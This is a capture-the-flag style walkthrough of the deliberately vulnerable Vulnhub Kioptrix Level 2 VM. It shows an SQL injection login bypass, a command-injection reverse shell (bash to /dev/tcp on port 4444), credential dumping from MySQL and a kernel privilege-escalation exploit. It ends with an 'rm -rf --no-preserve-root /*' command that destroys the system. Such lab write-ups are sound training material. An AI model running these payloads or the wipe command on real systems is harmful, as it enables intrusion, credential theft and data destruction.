---
title: Vulnhub, Kioptrix, Level 2
date: Thu Aug 15 05:01:39 PM EDT 2024
categories: [PentestNotes]
tags: [sqli,rce,vulnhub]
---

## About Release

- **Name**: Kioptrix: Level 1.1 (#2)
- **Date release**: 11 Feb 2011
- **Author**: [Kioptrix](https://www.vulnhub.com/author/kioptrix,8/)
- **Series**: [Kioptrix](https://www.vulnhub.com/series/kioptrix,8/)
- **Web page**: [http://www.kioptrix.com/blog/?page_id=135](https://web.archive.org/web/20121007161411/http://www.kioptrix.com/blog/?page_id=135)
## Download

- **Kioptrix_Level_2-original.rar** (Size: 404 MB)
- **Download (Mirror)**: [https://download.vulnhub.com/kioptrix/archive/Kioptrix_Level_2-original.rar](https://download.vulnhub.com/kioptrix/archive/Kioptrix_Level_2-original.rar)
- **Kioptrix_Level_2-update.rar** (Size: 406 MB)
- **Download**: [http://www.kioptrix.com/dlvm/Kioptrix_Level_2.rar](http://www.kioptrix.com/dlvm/Kioptrix_Level_2.rar)
- **Download (Mirror)**: [https://download.vulnhub.com/kioptrix/Kioptrix_Level_2-update.rar](https://download.vulnhub.com/kioptrix/Kioptrix_Level_2-update.rar)
## Description

This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.

**This is the second release of #2. First release had a bug in it with the web application**

2012/Feb/09: Re-releases
2011/Feb/11: Original Release

 **Checksum**:
- Original MD5: 987FFB98117BDEB6CA0AAC6EA22E755D
- Original SHA1: 7A0EA0F414DFA0E05B7DF504F21B325C6D3CC53B
- Re-release MD5: 987FFB98117BDEB6CA0AAC6EA22E755D
- Re-release SHA1: 7A0EA0F414DFA0E05B7DF504F21B325C6D3CC53B
## Recon

```bash
└─$ ip -4 -brief address show eth0
eth0             UP             10.0.2.15/24

└─$ sudo netdiscover -P -i eth0 -r 10.0.2.0/24 | tee netdiscover.log
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 10.0.2.1        52:54:00:12:35:00      1      60  Unknown vendor
 10.0.2.2        52:54:00:12:35:00      1      60  Unknown vendor
 10.0.2.3        08:00:27:64:6e:66      1      60  PCS Systemtechnik GmbH
 10.0.2.20       08:00:27:07:c8:75      1      60  PCS Systemtechnik GmbH

-- Active scan completed, 4 Hosts found.
```

{::options parse_block_html="true" /}

<details>

<summary markdown="span">nmap_scan.log</summary>

```log
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.0.2.20:22
Open 10.0.2.20:80
Open 10.0.2.20:111
Open 10.0.2.20:631
Open 10.0.2.20:1023
Open 10.0.2.20:3306
Open 10.0.2.20:443
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -vvv -sV -sC -Pn" on ip 10.0.2.20
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-22 14:48 UTC
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:48
Completed NSE at 14:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:48
Completed NSE at 14:48, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:48
Completed NSE at 14:48, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 14:48
Completed Parallel DNS resolution of 1 host. at 14:48, 0.04s elapsed
DNS resolution of 1 IPs took 0.05s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 14:48
Scanning 10.0.2.20 [7 ports]
Discovered open port 443/tcp on 10.0.2.20
Discovered open port 80/tcp on 10.0.2.20
Discovered open port 111/tcp on 10.0.2.20
Discovered open port 3306/tcp on 10.0.2.20
Discovered open port 22/tcp on 10.0.2.20
Discovered open port 1023/tcp on 10.0.2.20
Discovered open port 631/tcp on 10.0.2.20
Completed Connect Scan at 14:48, 0.00s elapsed (7 total ports)
Initiating Service scan at 14:48
Scanning 7 services on 10.0.2.20
Completed Service scan at 14:48, 11.02s elapsed (7 services on 1 host)
NSE: Script scanning 10.0.2.20.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:48
Completed NSE at 14:48, 7.39s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:48
Completed NSE at 14:48, 21.21s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:48
Completed NSE at 14:48, 0.00s elapsed
Nmap scan report for 10.0.2.20
Host is up, received user-set (0.00087s latency).
Scanned at 2024-07-22 14:48:05 UTC for 40s

PORT     STATE SERVICE    REASON  VERSION
22/tcp   open  ssh        syn-ack OpenSSH 3.9p1 (protocol 1.99)
| ssh-hostkey: 
|   1024 8f3e8b1e5863fecf27a318093b52cf72 (RSA1)
| 1024 35 149174282886581624883868648302761292182406879108668063702143177994710569161669502445416601666211201346192352271911333433971833283425439634231257314174441054335295864218587993634534355128377261436615077053235666774641007412196140534221696911370388178873572900977872600139866890316021962605461192127591516843621
|   1024 346b453dbacecab25355ef1e43703836 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAOWJ2N2BPBPm0HxCi630ZxHtTNMh+uVkeYCkKVNxavZkcJdpfFTOGZp054sj27mVZVtCeNMHhzAUpvRisn/cH4k4plLd1m8HACAVPtcgRrshCzb7wzQikrP+byCVypE0RpkQcDya+ngDMVzrkA+9KQSR/5W6BjldLW60A5oZgyfvAAAAFQC/iRZe4LlaYXwHvYYDpjnoCPY3xQAAAIBKFGl/zr/u1JxCV8a9dIAMIE0rk0jYtwvpDCdBre450ruoLII/hsparzdJs898SMWX1kEzigzUdtobDVT8nWdJAVRHCm8ruy4IQYIdtjYowXD7hxZTy/F0xOsiTRWBYMQPe8lW1oA+xabqlnCO3ppjmBecVlCwEMoeefnwGWAkxwAAAIAKajcioQiMDYW7veV13Yjmag6wyIia9+V9aO8JmgMi3cNr04Vl0FF+n7OIZ5QYvpSKcQgRzwNylEW5juV0Xh96m2g3rqEvDd4kTttCDlOltPgP6q6Z8JI0IGzcIGYBy6UWdIxj9D7F2ccc7fAM2o22+qgFp+FFiLeFDVbRhYz4sg==
|   1024 684d8cbbb65abd7971b87147ea004261 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAIEA4j5XFFw9Km2yphjpu1gzDBglGSpMxtR8zOvpH9gUbOMXXbCQeXgOK3rs4cs/j75G54jALm99Ky7tgToNaEuxmQmwnpYk9bntoDu9SkiT/hPZdOwq40yrfWIHzlUNWTpY3okTdf/YNUAdl4NOBOYbf0x/dsAdHHqSWnvZmruFA6M=
|_sshv1: Server supports SSHv1
80/tcp   open  http       syn-ack Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind    syn-ack 2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1           1020/udp   status
|_  100024  1           1023/tcp   status
443/tcp  open  ssl/https? syn-ack
|_ssl-date: 2024-07-22T18:48:24+00:00; +3h59m58s from scanner time.
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/emailAddress=root@localhost.localdomain/localityName=SomeCity/organizationalUnitName=SomeOrganizationalUnit
| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/emailAddress=root@localhost.localdomain/localityName=SomeCity/organizationalUnitName=SomeOrganizationalUnit
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: md5WithRSAEncryption
| Not valid before: 2009-10-08T00:10:47
| Not valid after:  2010-10-08T00:10:47
| MD5:   01de29f9fbfb2eb2beafe6243157090f
| SHA-1: 560c91966506fb0ffb8166b1ded3ac112ed4808a
| -----BEGIN CERTIFICATE-----
| MIIEDDCCA3WgAwIBAgIBADANBgkqhkiG9w0BAQQFADCBuzELMAkGA1UEBhMCLS0x
| EjAQBgNVBAgTCVNvbWVTdGF0ZTERMA8GA1UEBxMIU29tZUNpdHkxGTAXBgNVBAoT
| EFNvbWVPcmdhbml6YXRpb24xHzAdBgNVBAsTFlNvbWVPcmdhbml6YXRpb25hbFVu
| aXQxHjAcBgNVBAMTFWxvY2FsaG9zdC5sb2NhbGRvbWFpbjEpMCcGCSqGSIb3DQEJ
| ARYacm9vdEBsb2NhbGhvc3QubG9jYWxkb21haW4wHhcNMDkxMDA4MDAxMDQ3WhcN
| MTAxMDA4MDAxMDQ3WjCBuzELMAkGA1UEBhMCLS0xEjAQBgNVBAgTCVNvbWVTdGF0
| ZTERMA8GA1UEBxMIU29tZUNpdHkxGTAXBgNVBAoTEFNvbWVPcmdhbml6YXRpb24x
| HzAdBgNVBAsTFlNvbWVPcmdhbml6YXRpb25hbFVuaXQxHjAcBgNVBAMTFWxvY2Fs
| aG9zdC5sb2NhbGRvbWFpbjEpMCcGCSqGSIb3DQEJARYacm9vdEBsb2NhbGhvc3Qu
| bG9jYWxkb21haW4wgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAN4duNVEr4aL
| TUfsjacXKcCaRs1oTxsdNTIxkp7SV2PDD+mBY5shsXt/FMG7Upf4g605+W6ZEhfB
| WpLXonDFaRIxxn4AGSOLg8q20kUt9p2HZufaSLSwfSwJ+CTMwYtN8AU0jhf3r0y8
| jr+jjEU0HT4O4YXcnDRvbIUeHKedPPsTAgMBAAGjggEcMIIBGDAdBgNVHQ4EFgQU
| QAs+OwqZIYsWClQ2ZBav2uPP/mAwgegGA1UdIwSB4DCB3YAUQAs+OwqZIYsWClQ2
| ZBav2uPP/mChgcGkgb4wgbsxCzAJBgNVBAYTAi0tMRIwEAYDVQQIEwlTb21lU3Rh
| dGUxETAPBgNVBAcTCFNvbWVDaXR5MRkwFwYDVQQKExBTb21lT3JnYW5pemF0aW9u
| MR8wHQYDVQQLExZTb21lT3JnYW5pemF0aW9uYWxVbml0MR4wHAYDVQQDExVsb2Nh
| bGhvc3QubG9jYWxkb21haW4xKTAnBgkqhkiG9w0BCQEWGnJvb3RAbG9jYWxob3N0
| LmxvY2FsZG9tYWluggEAMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEEBQADgYEA
| Hvq7KPeUTn36Sz/Au95TmC7aSkhIkGVHMRGhWe7KTEflqQffYTqJOS4xsu/FxDRy
| 9IGOapsyILGEx57apuCYJW3tpwMUrpUXu/x9g3LM+VghiH0XxMOfbueVhqWZ+yP8
| LisROr5u+FeGOBBIINAmpWUX2xEdB4p97WYzP03rEQU=
|_-----END CERTIFICATE-----
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|_    SSL2_RC4_64_WITH_MD5
631/tcp  open  ipp        syn-ack CUPS 1.1
|_http-server-header: CUPS/1.1
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS POST PUT
|_  Potentially risky methods: PUT
|_http-title: 403 Forbidden
1023/tcp open  status     syn-ack 1 (RPC #100024)
3306/tcp open  mysql      syn-ack MySQL (unauthorized)

Host script results:
|_clock-skew: 3h59m57s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:48
Completed NSE at 14:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:48
Completed NSE at 14:48, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:48
Completed NSE at 14:48, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.06 seconds
```
</details>

{::options parse_block_html="false" /}

## HTTP (80)

We have rather plain sign in form:

![Writeup.png](/assets/images/Vulnhub/Kioptrix-Level-2/Writeup.png)

There's comment in html:
```html
<!-- Start of HTML when logged in as Administator -->
```

I was trying to trigger an error by simply `'`, but it didn't give anything.

Using `' OR 1=1 -- -` payload logs us into website:

![Writeup-1.png](/assets/images/Vulnhub/Kioptrix-Level-2/Writeup-1.png)

If we enter something we get redirected to `/pingit.php` which is vulnerable to command injection:

![Writeup-2.png](/assets/images/Vulnhub/Kioptrix-Level-2/Writeup-2.png)

Get a [reverse shell](https://www.revshells.com) on the box:

```bash
10.0.2.15; /bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.2.15/4444 0>&1'
```

### Reverse Shell

```bash
└─$ listen
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.0.2.20:32772.
bash: no job control in this shell
bash-3.00$ whoami
apache
bash-3.00$ cat pingit.php
<?php
print $_POST['ip'];
if (isset($_POST['submit'])){
        $target = $_REQUEST[ 'ip' ];
        echo '<pre>';
        echo shell_exec( 'ping -c 3 ' . $target );
        echo '</pre>';
    }
?>
bash-3.00$ cat index.php | grep mysql
        mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());
        mysql_select_db("webapp");
                $result = mysql_query($query);
                $row = mysql_fetch_array($result);
bash-3.00$ ls /home
harold
john
```

The php code has no sanitization and that's the security gap.

`index.php` also authorized us based on SQL query, meaning it has database connection string somewhere. The credentials didn't work for SSH.

> Mysql creds: `john:hiroshima`
{: .prompt-tip }

#### MySQL

```bash
bash-3.00$ mysql -u john -p'hiroshima' -e 'SHOW DATABASES;'
Database
mysql
test
webapp
bash-3.00$ mysql -u john -p'hiroshima' -e 'USE webapp; SHOW TABLES;'
Tables_in_webapp
users
bash-3.00$ mysql -u john -p'hiroshima' -e 'SELECT * FROM webapp.users;'
id      username        password
1       admin   5afac8d85f
2       john    66lajGGbla
bash-3.00$ mysql -u john -p'hiroshima' -e 'USE test; SHOW TABLES;'
bash-3.00$ mysql -u john -p'hiroshima' -e 'SELECT host,user,password FROM mysql.user WHERE user != "";'
host    user    password
localhost       root    5a6914ba69e02807
localhost.localdomain   root    5a6914ba69e02807
localhost       john    5a6914ba69e02807
```


## HTTP (631)

![Writeup-3.png](/assets/images/Vulnhub/Kioptrix-Level-2/Writeup-3.png)

Any attempt to enumerate the webapp results in Forbidden.

Check service locally:
```bash
bash-3.00$ curl 0:631 -s
<HTML>
<HEAD>
        <TITLE>Common UNIX Printing System</TITLE>
        <LINK REL=STYLESHEET TYPE="text/css" HREF="cups.css">
        <MAP NAME="navbar">
                <AREA SHAPE="RECT" COORDS="12,10,50,20" HREF="http://www.easysw.com" ALT="Easy Software Products Home Page">
                <AREA SHAPE="RECT" COORDS="82,10,196,20" HREF="admin" ALT="Do Administration Tasks">
                <AREA SHAPE="RECT" COORDS="216,10,280,20" HREF="classes" ALT="Manage Printer Classes Status">
                <AREA SHAPE="RECT" COORDS="300,10,336,20" HREF="documentation.html" ALT="On-Line Help">
                <AREA SHAPE="RECT" COORDS="356,10,394,20" HREF="jobs" ALT="Manage Jobs">
                <AREA SHAPE="RECT" COORDS="414,10,476,20" HREF="printers" ALT="Manage Printers">
                <AREA SHAPE="RECT" COORDS="496,10,568,20" HREF="http://www.cups.org" ALT="Download the Current CUPS Software">
        </MAP>
</HEAD>

<BODY BGCOLOR="#cccc99" TEXT="#000000" LINK="#0000FF" VLINK="#FF00FF">
<CENTER>
<IMG SRC="/images/navbar.gif" WIDTH="583" HEIGHT="30" USEMAP="#navbar" BORDER="0" ALT="Common UNIX Printing System">
</CENTER>

<H1><A HREF="admin">Do Administration Tasks</A></H1>
<H1><A HREF="classes">Manage Printer Classes</A></H1>
<H1><A HREF="documentation.html">On-Line Help</A></H1>
<H1><A HREF="jobs">Manage Jobs</A></H1>
<H1><A HREF="printers">Manage Printers</A></H1>
<H1><A HREF="http://www.cups.org">Download the Current CUPS Software</A></H1>

<HR>

<P>The Common UNIX Printing System, CUPS, and the CUPS logo are the
trademark property of <A HREF="http://www.easysw.com">Easy Software
Products</A>. CUPS is copyright 1997-2003 by Easy Software Products,
All Rights Reserved.

</BODY>
</HTML>
```

I really wanted to tunnel the 631 port to see what it could do, but after few attempts with static binaries and whatnot the system wouldn't tunnel anything... So after some time I gave up on this port.

## Linpeas

![Writeup-4.png](/assets/images/Vulnhub/Kioptrix-Level-2/Writeup-4.png)

Looks like Kernel version itself is vulnerable.

![Writeup-5.png](/assets/images/Vulnhub/Kioptrix-Level-2/Writeup-5.png)

## Root

[https://www.exploit-db.com/exploits/9542](https://www.exploit-db.com/exploits/9542)

```bash
└─$ curl -L https://www.exploit-db.com/download/9542 -o exp.c
bash-3.00$ cd /tmp
bash-3.00$ curl 10.0.2.15/exp.c -Os
bash-3.00$ gcc exp.c -o exp && ./exp
sh-3.00# id
uid=0(root) gid=0(root) groups=48(apache)
```

The Kernel version was vulnerable to [CVE-2009-2698](https://nvd.nist.gov/vuln/detail/CVE-2009-2698) and we got `root` from `apache` user.

---

Since machine is no longer needed yeet it off the existence:
```bash
rm -rf --no-preserve-root /*
```

> **Note**: DONT TRY ON ACTUAL SYSTEMS!
{: .prompt-danger }

